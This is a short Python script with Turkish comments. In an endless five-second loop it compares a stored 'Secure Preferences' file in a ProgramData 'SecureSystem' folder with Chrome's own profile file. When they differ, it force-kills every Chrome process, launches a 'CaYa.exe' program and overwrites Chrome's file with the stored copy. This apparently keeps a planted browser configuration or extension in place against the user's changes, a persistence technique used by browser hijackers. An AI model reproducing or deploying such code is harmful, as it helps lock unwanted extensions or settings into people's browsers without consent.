import os
import shutil
import json
import psutil
import subprocess
import time


def main():
    while True:
        # Programdatada bulunan SecureSystem klasörü ve Google'daki Secure Preferences dosyası yolu
        programdata_folder = os.path.join(os.getenv('ProgramData'), 'SecureSystem')
        programdata_secure_preferences_path = os.path.join(programdata_folder, 'Secure Preferences')
        google_secure_preferences_path = os.path.join(os.getenv('LOCALAPPDATA'),
                                                      'Google\\Chrome\\User Data\\Default\\Secure Preferences')

        # Eğer SecureSystem klasörü varsa içeriğini kontrol et
        if os.path.exists(programdata_folder):
            # Eğer Secure Preferences dosyası varsa içeriğini kontrol et
            if os.path.exists(programdata_secure_preferences_path):
                programdata_contents = read_secure_preferences(programdata_secure_preferences_path)
                google_contents = read_secure_preferences(google_secure_preferences_path)

                # Eğer dosyaların içerikleri farklıysa
                if programdata_contents != google_contents:
                    # Google Chrome'u kapat
                    close_chrome()
                    subprocess.Popen(["C:\\Program Files (x86)\\CaYaLab\\CaYa.exe"])

                    # Programdatadaki dosyayı Google'daki dosya ile değiştir
                    shutil.copy(programdata_secure_preferences_path, google_secure_preferences_path)

                    print("Secure Preferences dosyası başarıyla değiştirildi.")
                else:
                    print("Secure Preferences dosyası zaten güncel.")
            else:
                print("Secure Preferences dosyası bulunamadı.")
        else:
            print("SecureSystem klasörü bulunamadı.")

        # 5 saniye bekleyerek işlemi tekrarla
        time.sleep(5)


def read_secure_preferences(file_path):
    # Secure Preferences dosyasını oku
    try:
        with open(file_path, 'r', encoding='utf-8') as file:
            contents = json.load(file)
        return contents
    except FileNotFoundError:
        return None


def close_chrome():
    # Google Chrome'u kapat
    for process in psutil.process_iter(['pid', 'name']):
        if 'chrome.exe' in process.info['name'].lower():
            subprocess.run(['taskkill', '/F', '/PID', str(process.info['pid'])])


if __name__ == "__main__":
    main()
